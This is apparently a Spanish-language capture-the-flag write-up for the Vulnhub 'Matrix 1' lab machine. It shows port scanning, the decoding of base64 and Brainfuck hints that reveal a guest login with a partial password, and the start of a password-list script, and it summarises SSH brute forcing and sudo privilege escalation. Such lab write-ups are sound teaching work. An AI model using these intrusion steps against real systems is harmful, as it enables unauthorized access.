<!doctype html><html lang=es><head><title>Vulnhub Matrix 1 WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="Vulnhub 'Matrix 1' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="Vulnhub Matrix 1 WriteUp"><meta name=twitter:description content="Vulnhub 'Matrix 1' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/matrix1/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="Vulnhub Matrix 1 WriteUp"><meta property="og:description" content="Vulnhub 'Matrix 1' WriteUp"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-18T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-18T00:00:00+00:00"><meta property="article:tag" content="Vulnhub"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Burpsuite"><meta property="article:tag" content="Nmap"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/matrix1/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.064032bdabf71803ac209bfac7afe4609898265440caa172acba739538eb4845.css integrity="sha256-BkAyvav3GAOsIJv6x6/kYJiYJlRAyqFyrLpzlTjrSEU=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/matrix1/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/matrix1/>Vulnhub Matrix 1 WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-08-18T00:00:00Z>18 agosto, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
14 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/vulnhub/>Vulnhub</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/nmap/>Nmap</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/whatweb/>Whatweb</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/php/>Php</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/python/>Python</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/brainfuck/>Brainfuck</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/brute-force-password-login/>Brute Force Password Login</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/ssh/>Ssh</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/sudo/>Sudo</a></span></div></div></header><div class=post-content><h1 id=matrix-1----vulnhub>Matrix 1 &ndash; Vulnhub
<a class=heading-link href=#matrix-1----vulnhub><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty / Dificultad: <em>Easy</em></li><li>Platform / Plataforma: <em>Vulnhub</em></li></ul><p><img alt="&lsquo;Vulnhub&rsquo; Avatar" src=/pentesting/images/Vulnhub_avatar.png></p><hr><h2 id=resumen>Resumen
<a class=heading-link href=#resumen><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Matrix 1</code> es una m√°quina f√°cil y gratuita basada en <code>Linux</code> de la plataforma <code>Vulnhub</code>. Luego de un escaneo inicial sobre los puertos <code>TCP</code> abiertos, √©stos muestran que la m√°quina v√≠ctima est√° corriendo sitios web en 2 puertos distintos: <code>80</code> y <code>31337</code>. Visitando el cl√°sico puerto <code>80</code> nos da una pista que nos lleva al sitio del puerto <code>31337</code>. Mirando el c√≥digo fuente de la segunda p√°gina tiene un texto encodeado que nos da la ubicaci√≥n de un archivo oculto. Revisando este archivo oculto nos da informaci√≥n acerca de un usuario y potencial contrase√±a; pero la contrase√±a est√° dada a medias. Tenemos que intentar distintas combinaciones de esta posible contrase√±a a trav√©s de un <code>Brute Force Password Login</code> (intentos de logueo por fuerza bruta) a trav√©s del servicio <code>SSH</code> hasta que encontramos una contrase√±a v√°lida. Una vez dentro como este usuario vemos que puede correr el binario <code>cp</code> (copy/copiar) como otro usuario dentro de la m√°quina v√≠ctima; esto nos permita copiar una key de <code>SSH</code> dentro de los directorios de este usuario; garantiz√°ndonos as√≠ acceso a trav√©s de <code>SSH</code>. Este nuevo usuario puede correr un script con <code>sudo</code> como <code>root</code>. No obstante, este script no existe. De manera que podemos crear un script con un nombre que permite correrlo con <code>sudo</code> y as√≠ convertirnos en <code>root</code>.</p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Empezamos con un scan con <code>Nmap</code> para chequear qu√© puertos <code>TCP</code> est√°n abiertos en la m√°quina v√≠ctima:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sS -p- --open --min-rate=5000 -n -Pn -vvv 10.20.1.122
</span></span></span></code></pre></div><ul><li>Del primer scan podemos ver 3 puertos abiertos: <code>22</code> <code>SSH</code>, <code>80</code> <code>HTTP</code> y <code>31337</code> <code>HTTP</code> tambi√©n. Chequeando versiones sobre estos puertos, tenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80,31337 10.20.1.122 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 22:58 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.122
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.00039s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT      STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp    open  ssh     OpenSSH 7.7 (protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)
</span></span></span><span class=line><span class=cl><span class=go>|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp    open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Welcome in Matrix
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
</span></span></span><span class=line><span class=cl><span class=go>31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Welcome in Matrix
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:4E:2D:7A (Oracle VirtualBox virtual NIC)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 24.74 seconds
</span></span></span></code></pre></div><ul><li>Usando <code>WhatWeb</code> en ambos sitios <code>HTTP</code> nos muestra que ambos sitios web est√°n corriendo usando <code>Python</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ whatweb -a 3 http://10.20.1.122
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>http://10.20.1.122 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[SimpleHTTP/0.6 Python/2.7.14], IP[10.20.1.122], JQuery, Python[2.7.14], Script[text/javascript], Title[Welcome in Matrix]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ whatweb -a 3 http://10.20.1.122:31337
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>http://10.20.1.122:31337 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[SimpleHTTP/0.6 Python/2.7.14], IP[10.20.1.122], JQuery, Python[2.7.14], Script[text/javascript], Title[Welcome in Matrix]
</span></span></span></code></pre></div><ul><li>Visitando <code>http://10.20.1.122</code> (en el puerto <code>80</code> de la m√°quina v√≠ctima) nos muestra una simple p√°gina web:</li></ul><p><img alt="Matrix 1" src=/pentesting/images/Matrix1_1.png></p><ul><li>Aqu√≠ puedo leer el texto &ldquo;Follow the Rabbit&rdquo; (sigue al conejo), lo cual puede ser una pista.</li><li>Analizando el c√≥digo fuente de la p√°gina del puerto <code>80</code> (Ctrl+U en <code>Firefox</code>, o usando <code>cURL</code>) puedo ver algo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.20.1.122
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;!-- service --&gt;
</span></span></span><span class=line><span class=cl><span class=go>                                                                &lt;div class=&#34;service&#34;&gt;&lt;img src=&#34;assets/img/p0rt_31337.png&#34;/ width=&#34;15&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>                                                                &lt;/div&gt;&lt;!-- End / service --&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>Hay un archivo con un nombre peculiar: <code>/assets/img/p0rt_31337.png</code>. Visitando <code>http://10.20.1.122/assets/img/p0rt_31337.png</code> s√≥lo muestra la imagen de un conejito:</li></ul><p><img alt="Matrix 2" src=/pentesting/images/Matrix1_2.png></p><ul><li>Deber√≠amos de seguir las pistas dadas por el nombre de la imagen <code>p0rt_31337.png</code> y visitar <code>http://10.20.1.122:31337</code>. Ahora podemos ver una p√°gina web similar:</li></ul><p><img alt="Matrix 3" src=/pentesting/images/Matrix1_3.png></p><ul><li>Mirando de nuevo el c√≥digo fuente de esta nueva p√°gina en este nuevo puerto con <code>cURL</code> tenemos un texto encodeado:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.20.1.122:31337
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=go>                &lt;title&gt;Welcome in Matrix&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;!-- service --&gt;
</span></span></span><span class=line><span class=cl><span class=go>                                                                &lt;div class=&#34;service&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>                                                                        &lt;!--p class=&#34;service__text&#34;&gt;ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=&lt;/p--&gt;
</span></span></span><span class=line><span class=cl><span class=go>                                                                &lt;/div&gt;&lt;!-- End / service --&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>Este texto est√°, aparentemente, encodedeado en <code>base64</code>. Podemos tratar de decodearlo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>echo &#34;Then you&#39;ll see, that it is not the spoon that bends, it is only yourself. &#34; &gt; Cypher.matrix
</span></span></span></code></pre></div><ul><li>Aqu√≠ puedo ver que se est√° utilizando el comando <code>echo</code> de <code>UNIX</code> sobre un texto y guard√°ndola en un archivo <code>Cypher.matrix</code>. ¬øQu√© tal si este archivo existe en la m√°quina v√≠ctima? Podemos corroborarlo r√°pidamente usando <code>cURL</code> sobre este recurso (si existe) en consola:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.20.1.122:31337/Cypher.matrix
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ ++.&lt;+ +++[- &gt;++++ &lt;]&gt;++ ++++. +++++
</span></span></span><span class=line><span class=cl><span class=go>+.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;--- -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++.-
</span></span></span><span class=line><span class=cl><span class=go>-.&lt;++ +[-&gt;+ ++&lt;]&gt; ++++. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- --.&lt;+
</span></span></span><span class=line><span class=cl><span class=go>+++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +.+++ +++++ +.+++ +++.&lt; +++[- &gt;---&lt; ]&gt;---
</span></span></span><span class=line><span class=cl><span class=go>---.&lt; +++[- &gt;+++&lt; ]&gt;+++ +.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;-.&lt; +++++ +++[-
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>&gt;</span>++++ ++++&lt; <span class=o>]</span>&gt;+++ +++++ +.+++ ++.++ ++++. ----- .&lt;+++ +++++ <span class=o>[</span>-&gt;-- -----
</span></span><span class=line><span class=cl><span class=go>-&lt;]&gt;- ----- ----- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt;++
</span></span></span><span class=line><span class=cl><span class=go>+[-&gt;- --&lt;]&gt; ---.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ ++.-- .---- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+
</span></span></span><span class=line><span class=cl><span class=go>+++++ .&lt;+++ +++++ +[-&gt;- ----- ---&lt;] &gt;---- ---.&lt; +++++ +++[- &gt;++++ ++++&lt;
</span></span></span><span class=line><span class=cl><span class=go>]&gt;+.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;--. &lt;++++ ++++[
</span></span></span><span class=line><span class=cl><span class=go>-&gt;+++ +++++ &lt;]&gt;++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; .&lt;+++
</span></span></span><span class=line><span class=cl><span class=go>[-&gt;++ +&lt;]&gt;+ ++++. +.&lt;++ +++++ +[-&gt;- ----- --&lt;]&gt; ----- ---.&lt; +++[- &gt;---&lt;
</span></span></span><span class=line><span class=cl><span class=go>]&gt;--- .&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;++++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++
</span></span></span><span class=line><span class=cl><span class=go>+[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- -----
</span></span></span><span class=line><span class=cl><span class=go>-.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++++ +++++ +++++ +.&lt;++ +[-&gt;- --&lt;]&gt; -----
</span></span></span><span class=line><span class=cl><span class=go>-.&lt;++ ++[-&gt; ++++&lt; ]&gt;++. .++++ .---- ----. +++.&lt; +++[- &gt;---&lt; ]&gt;--- --.&lt;+
</span></span></span><span class=line><span class=cl><span class=go>+++++ ++[-&gt; ----- ---&lt;] &gt;---- .&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ +++++
</span></span></span><span class=line><span class=cl><span class=go>.&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ----- -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++ +++++
</span></span></span><span class=line><span class=cl><span class=go>+++.. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- ----- --.&lt;+ +++++ ++[-&gt; +++++ +++&lt;]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>&gt;</span>++.&lt; +++++ <span class=o>[</span>-&gt;-- ---&lt;<span class=o>]</span> &gt;-..&lt; +++++ +++<span class=o>[</span>- &gt;---- ----&lt; <span class=o>]</span>&gt;--- ----- ---.-
</span></span><span class=line><span class=cl><span class=go>--.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ .&lt;+++ ++[-&gt; +++++ &lt;]&gt;++ +++++ +.+++
</span></span></span><span class=line><span class=cl><span class=go>++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----. &lt;++++ +[-&gt;-
</span></span></span><span class=line><span class=cl><span class=go>----&lt; ]&gt;-.&lt; +++++ [-&gt;++ +++&lt;] &gt;++++ ++++. &lt;++++ +[-&gt;+ ++++&lt; ]&gt;+++ +++++
</span></span></span><span class=line><span class=cl><span class=go>+.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.+ .&lt;+++ +[-&gt;- ---&lt;] &gt;---- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +..&lt;+
</span></span></span><span class=line><span class=cl><span class=go>++[-&gt; +++&lt;] &gt;++++ .&lt;+++ +++++ [-&gt;-- ----- -&lt;]&gt;- ----- ----- --.&lt;+ ++[-&gt;
</span></span></span><span class=line><span class=cl><span class=go>---&lt;] &gt;---. &lt;++++ ++[-&gt; +++++ +&lt;]&gt;+ ++++. &lt;++++ ++[-&gt; ----- -&lt;]&gt;- ----.
</span></span></span><span class=line><span class=cl><span class=go>&lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ ++++. +++++ ++++. +++.&lt; +++[- &gt;---&lt; ]&gt;--.
</span></span></span><span class=line><span class=cl><span class=go>--.&lt;+ ++[-&gt; +++&lt;] &gt;++++ ++.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-- -.&lt;++ +++++
</span></span></span><span class=line><span class=cl><span class=go>+[-&gt;+ +++++ ++&lt;]&gt; +++++ +++++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;--.&lt; ++++[ -&gt;+++ +&lt;]&gt;+
</span></span></span><span class=line><span class=cl><span class=go>+.+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++
</span></span></span><span class=line><span class=cl><span class=go>+.+++ .---- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- ---.&lt; +++++
</span></span></span><span class=line><span class=cl><span class=go>+++[- &gt;++++ ++++&lt; ]&gt;+++ .++++ +.--- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; +.&lt;++ ++[-&gt;
</span></span></span><span class=line><span class=cl><span class=go>----&lt; ]&gt;-.+ +.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.&lt; +++[- &gt;---&lt; ]&gt;--- ---.&lt; +++[- &gt;+++&lt;
</span></span></span><span class=line><span class=cl><span class=go>]&gt;+++ +.+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- -.&lt;++ +++++ ++[-&gt; +++++ ++++&lt;
</span></span></span><span class=line><span class=cl><span class=go>]&gt;++. ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- ---.&lt; +++++ +[-&gt;+
</span></span></span><span class=line><span class=cl><span class=go>+++++ &lt;]&gt;++ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ---.&lt; +++++ +++[- &gt;++++ ++++&lt;
</span></span></span><span class=line><span class=cl><span class=go>]&gt;+++ +++++ .---- ---.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; -.&lt;++
</span></span></span><span class=line><span class=cl><span class=go>+++++ +[-&gt;- ----- --&lt;]&gt; ----- .&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;+.&lt;+ ++[-&gt;
</span></span></span><span class=line><span class=cl><span class=go>---&lt;] &gt;---- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +.--- -.&lt;++ +[-&gt;- --&lt;]&gt; --.++ .++.- .&lt;+++
</span></span></span><span class=line><span class=cl><span class=go>+++++ [-&gt;-- ----- -&lt;]&gt;- ---.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ .&lt;+++
</span></span></span><span class=line><span class=cl><span class=go>[-&gt;-- -&lt;]&gt;- ----. &lt;+++[ -&gt;+++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++ ++[-&gt;
</span></span></span><span class=line><span class=cl><span class=go>----- ---&lt;] &gt;---- ----. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;++++ +++.. &lt;++++ +++[-
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>&gt;</span>---- ---&lt;<span class=o>]</span> &gt;---- ---.&lt; +++++ ++++<span class=o>[</span> -&gt;+++ +++++ +&lt;<span class=o>]</span>&gt;+ ++.-- .++++ +++.&lt;
</span></span><span class=line><span class=cl><span class=go>+++++ ++++[ -&gt;--- ----- -&lt;]&gt;- ----- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++
</span></span></span><span class=line><span class=cl><span class=go>+++++ +.&lt;++ +[-&gt;- --&lt;]&gt; -.+++ +++.- --.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-.
</span></span></span><span class=line><span class=cl><span class=go>&lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ .++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>&gt;</span>--.+ +++++ ++.&lt;+ +++++ ++<span class=o>[</span>-&gt; ----- ---&lt;<span class=o>]</span> &gt;---- ----- --.&lt;+ +++++ ++<span class=o>[</span>-&gt;
</span></span><span class=line><span class=cl><span class=go>+++++ +++&lt;] &gt;+.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .&lt;+++ +++++ [-&gt;--
</span></span></span><span class=line><span class=cl><span class=go>----- -&lt;]&gt;- ---.&lt; +++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +++.+ ++.++ +++.&lt; +++[-
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>&gt;</span>---&lt; <span class=o>]</span>&gt;-.&lt; +++++ +++<span class=o>[</span>- &gt;---- ----&lt; <span class=o>]</span>&gt;--- -.&lt;++ +++++ +<span class=o>[</span>-&gt;+ +++++ ++&lt;<span class=o>]</span>&gt;
</span></span><span class=line><span class=cl><span class=go>+++.&lt; +++[- &gt;+++&lt; ]&gt;+++ .+++. .&lt;+++ [-&gt;-- -&lt;]&gt;- ---.- -.&lt;++ ++[-&gt; ++++&lt;
</span></span></span><span class=line><span class=cl><span class=go>]&gt;+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++
</span></span></span><span class=line><span class=cl><span class=go>.+.-- .---- ----- .++++ +.--- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- -----
</span></span></span><span class=line><span class=cl><span class=go>.&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ +++++ ++++. ----- ----. &lt;++++ ++++[
</span></span></span><span class=line><span class=cl><span class=go>-&gt;--- ----- &lt;]&gt;-- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ ++++.
</span></span></span><span class=line><span class=cl><span class=go>&lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; ++..+ +++.- ----- --.++ +.&lt;++
</span></span></span><span class=line><span class=cl><span class=go>+[-&gt;- --&lt;]&gt; ----- .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- --.&lt;+ ++++[ -&gt;--- --&lt;]&gt;
</span></span></span><span class=line><span class=cl><span class=go>----- ---.- --.&lt;
</span></span></span></code></pre></div><ul><li>Aqu√≠ puedo ver un texto &ldquo;random&rdquo;. No obstante, esta es la sintaxis que usualmente se utiliza para el lenguage <code>Brainfuck</code>, usualmente. Podemos ir a <a href=https://www.dcode.fr/brainfuck-language class=external-link target=_blank rel=noopener>esta p√°gina</a>, copiar el texto hallado en el archivo <code>Cypher.matrix</code> y pas√°rselo a la p√°gina para decodearlo. Decodearlo nos muestra un mensaje:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>You can enter into matrix as guest, with password k1ll0rXX
</span></span><span class=line><span class=cl>Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.
</span></span></code></pre></div><ul><li>Basados en el texto, tenemos un usuario <code>guest</code> con contrase√±a <code>k1ll0rXX</code>, donde <code>XX</code> puede ser una combinaci√≥n de caracteres. Es as√≠ como nos creamos un simple script en <code>Python</code> para crear un diccionario:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
